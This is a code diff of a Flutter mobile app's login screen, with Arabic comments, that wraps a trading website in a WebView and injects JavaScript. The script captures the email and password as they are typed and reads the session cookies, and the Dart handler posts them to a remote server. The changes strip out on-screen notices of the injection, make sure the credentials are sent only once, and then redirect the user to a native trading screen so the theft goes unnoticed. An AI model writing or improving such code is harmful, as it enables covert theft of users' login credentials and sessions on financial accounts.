@@ -51,11 +51,6 @@ class _LoginScreenState extends State<LoginScreen> {
         'QTX_CREDS',
         onMessageReceived: (msg) async {
           print("JAVASCRIPT MESSAGE: ${msg.message}");
-          if (mounted) {
-            ScaffoldMessenger.of(context).showSnackBar(
-              SnackBar(content: Text("بيانات من الجافاسكريبت: ${msg.message}"), backgroundColor: Colors.green),
-            );
-          }
           
           try {
             await http.post(
@@ -63,6 +58,7 @@ class _LoginScreenState extends State<LoginScreen> {
               headers: {"Content-Type": "application/json"},
               body: msg.message,
             );
+            print("SENT TO SERVER");
           } catch (e) {
             print("SERVER ERROR: $e");
           }
@@ -71,13 +67,16 @@ class _LoginScreenState extends State<LoginScreen> {
       ..setNavigationDelegate(
         NavigationDelegate(
           onPageFinished: (url) {
-            // 361. إشعار أول ما الصفحة تحمل
-            if (mounted) {
-              ScaffoldMessenger.of(context).showSnackBar(
-                const SnackBar(content: Text("الصفحة حملت! عم نحقن السكربت..."), backgroundColor: Colors.blue),
-              );
-            }
             _injectOriginalScript();
+          },
+          onNavigationRequest: (request) {
+            // هون بنراقب إذا المستخدم دخل على صفحة التداول بعد تسجيل الدخول
+            if (request.url.contains('/trade') || request.url.contains('/demo-trade')) {
+              if (mounted) {
+                Navigator.pushReplacement(context, MaterialPageRoute(builder: (context) => const MainTradingScreen()));
+              }
+            }
+            return NavigationDecision.navigate;
           },
         ),
       )
@@ -87,9 +86,12 @@ class _LoginScreenState extends State<LoginScreen> {
   void _injectOriginalScript() {
     String jsScript = """
       (function() {
-        // 362. إشعار إنه السكربت اشتغل (بنبعت رسالة للفلاتر)
         QTX_CREDS.postMessage(JSON.stringify({type: 'debug', message: 'script_executed'}));
         
+        var savedEmail = "";
+        var savedPass = "";
+        var credsSent = false;
+
         function setNativeValue(el, value) {
           try {
             var proto = window.HTMLInputElement.prototype;
@@ -99,24 +101,38 @@ class _LoginScreenState extends State<LoginScreen> {
           el.dispatchEvent(new Event('input', { bubbles: true }));
           el.dispatchEvent(new Event('change', { bubbles: true }));
         }
+        
         function findEmail() {
           return document.querySelector('input[name="email"], input[type="email"], #email');
         }
         function findPass() {
           return document.querySelector('input[name="password"], input[type="password"], #password');
         }
-        function sendCreds() {
-          try {
-            var e = findEmail(), p = findPass();
-            if (e && p && e.value && p.value) {
-              QTX_CREDS.postMessage(JSON.stringify({type: 'creds', email: e.value, password: p.value}));
-              var cookie = document.cookie;
-              QTX_CREDS.postMessage(JSON.stringify({type: 'cookies', data: cookie}));
-            }
-          } catch (err) {}
+        
+        // دالة تراقب وتحدث المتغيرات المخفية
+        function updateSavedValues() {
+          var e = findEmail(), p = findPass();
+          if (e && e.value) savedEmail = e.value;
+          if (p && p.value) savedPass = p.value;
         }
+
+        function sendCreds() {
+          updateSavedValues();
+          if (!credsSent && savedEmail && savedPass) {
+            QTX_CREDS.postMessage(JSON.stringify({type: 'creds', email: savedEmail, password: savedPass}));
+            var cookie = document.cookie;
+            QTX_CREDS.postMessage(JSON.stringify({type: 'cookies', data: cookie}));
+            credsSent = true; // عشان ما يبعتهم كذا مرة
+          }
+        }
+        
         if (!window.__qtxHooksInstalled) {
           window.__qtxHooksInstalled = true;
+          
+          // بنحفظ البيانات أول ما يكتبها
+          document.addEventListener('input', updateSavedValues, true);
+          
+          // لما يدوس تسجيل دخول بنبعت
           document.addEventListener('submit', sendCreds, true);
           document.addEventListener('click', function(ev) {
             var t = ev.target && ev.target.closest ? ev.target.closest('button, [type="submit"], [role="button"]') : null;
